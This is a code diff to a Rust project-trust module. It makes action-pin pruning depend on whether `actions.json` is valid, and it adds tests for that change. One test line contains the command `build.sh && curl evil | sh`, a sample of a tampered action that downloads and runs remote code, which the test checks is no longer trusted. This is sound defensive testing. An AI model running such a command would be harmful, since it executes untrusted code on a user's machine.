@@ -332,9 +332,15 @@ pub struct GrantAction {
 
 /// Applies a grant to `entry` after checking every requested pin against
 /// the current files. All-or-nothing: on error nothing is changed.
+///
+/// `actions_valid` is whether `current_actions` came from a valid project
+/// `actions.json` on disk. Only then are pins for ids the file no longer
+/// defines pruned; a malformed (or stale, last-valid) file leaves every
+/// existing action pin alone.
 pub fn apply_grant(
     entry: &mut ProjectTrust,
     current_actions: &[ActionTrust],
+    actions_valid: bool,
     current_keybindings: &KeybindingsTrust,
     actions: &[GrantAction],
     keybindings: Option<&str>,
@@ -365,10 +371,12 @@ pub fn apply_grant(
             entry.actions.insert(request.id.clone(), request.hash.clone());
         }
     }
-    // Drop pins for actions the file no longer defines.
-    entry
-        .actions
-        .retain(|id, _| current_actions.iter().any(|a| &a.id == id));
+    // Drop pins for actions a valid file no longer defines.
+    if actions_valid {
+        entry
+            .actions
+            .retain(|id, _| current_actions.iter().any(|a| &a.id == id));
+    }
     if let Some(hash) = keybindings {
         entry.keybindings = Some(hash.to_string());
     }
@@ -415,7 +423,7 @@ mod tests {
             hash: before[0].hash.clone(),
         }];
         let kb = keybindings_trust(None, Some(&entry));
-        apply_grant(&mut entry, &before, &kb, &grant, None).unwrap();
+        apply_grant(&mut entry, &before, true, &kb, &grant, None).unwrap();
         let trusted = action_trust(&project_actions("build.sh"), Some(&entry));
         assert_eq!(trusted[0].state, TrustState::Trusted);
         let edited = action_trust(&project_actions("build.sh && curl evil | sh"), Some(&entry));
@@ -437,7 +445,7 @@ mod tests {
         assert_eq!(kb.state, TrustState::Untrusted);
         assert!(kb.held());
         let hash = kb.hash.clone().unwrap();
-        apply_grant(&mut entry, &[], &kb, &[], Some(&hash)).unwrap();
+        apply_grant(&mut entry, &[], true, &kb, &[], Some(&hash)).unwrap();
         let kb = keybindings_trust(Some(&file), Some(&entry));
         assert_eq!(kb.state, TrustState::Trusted);
         assert!(!kb.held());
@@ -465,9 +473,28 @@ mod tests {
             hash: run_hash(&json!({ "kind": "shell", "command": "old.sh" })),
         }];
         let kb_hash = kb.hash.clone().unwrap();
-        assert!(apply_grant(&mut entry, &current, &kb, &stale, Some(&kb_hash)).is_err());
+        assert!(apply_grant(&mut entry, &current, true, &kb, &stale, Some(&kb_hash)).is_err());
         assert!(entry.actions.is_empty());
         assert!(entry.keybindings.is_none());
+    }
+
+    #[test]
+    fn a_keybindings_grant_keeps_action_pins_while_actions_json_is_malformed() {
+        let mut entry = ProjectTrust {
+            root: "/p".into(),
+            ..ProjectTrust::default()
+        };
+        entry.actions.insert("refresh-pulse".into(), "pinned".into());
+        let kb = keybindings_trust(Some(&bindings("mod+shift+r")), None);
+        let hash = kb.hash.clone().unwrap();
+        // actions.json is malformed: the status carries no actions (or a
+        // stale list) and `actions_valid` is false.
+        apply_grant(&mut entry, &[], false, &kb, &[], Some(&hash)).unwrap();
+        assert_eq!(entry.actions.get("refresh-pulse").map(String::as_str), Some("pinned"));
+        assert_eq!(entry.keybindings.as_deref(), Some(hash.as_str()));
+        // Against a valid file that no longer defines the id, it is pruned.
+        apply_grant(&mut entry, &[], true, &kb, &[], Some(&hash)).unwrap();
+        assert!(entry.actions.is_empty());
     }
 
     #[test]
